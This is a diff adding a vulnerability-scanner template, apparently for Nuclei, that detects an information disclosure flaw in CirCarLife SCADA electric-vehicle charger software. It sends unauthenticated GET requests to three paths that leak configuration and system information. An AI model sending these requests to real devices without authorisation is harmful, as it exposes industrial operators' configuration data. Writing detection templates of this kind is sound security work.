@@ -1,0 +1,57 @@
+id: circarlife-scada-info-disclosure
+info:
+  name: CirCarLife SCADA Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    CirCarLife SCADA versions under 4.3.0 and OCPP implementations under 1.5.0 contain an information disclosure vulnerability that leaks configuration and log information.
+  reference:
+    - https://www.exploit-db.com/exploits/45384
+    - https://circontrol.com
+  tags: information-disclosure
+http:
+  - raw:
+      - |
+        GET /html/repository HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "/circarlife/"
+          - "sources"
+        part: body
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /services/system/setup.json HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "nameserver"
+          - "clientid"
+        part: body
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /services/system/info.html HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Platform version"
+          - "Drivers"
+        part: body
+      - type: status
+        status:
+          - 200
